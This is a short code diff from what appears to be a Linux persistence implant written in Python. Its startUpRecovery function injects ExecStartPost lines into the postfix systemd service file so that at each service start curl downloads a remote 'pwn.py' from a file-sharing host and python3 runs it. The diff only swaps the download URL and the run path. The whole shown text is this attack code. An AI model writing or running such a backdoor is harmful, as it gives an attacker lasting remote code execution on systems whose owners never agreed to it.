@@ -119,8 +119,8 @@ def is_root():
 
 def startUpRecovery():
     path = '/etc/systemd/system/multi-user.target.wants/postfix.service'
-    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/w9jx21/pwn.py\n".format(locationFile)
-    ourPwnShitRun = "ExecStartPost=/usr/bin/python3 {}{}\n".format(locationDir, locationFile)
+    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/7BQ8Tz/pwn.py\n".format(locationFile)
+    ourPwnShitRun = "ExecStartPost=/usr/bin/python3 {}\n".format(locationFile)
     
     try:
         with open(path, "r") as service:
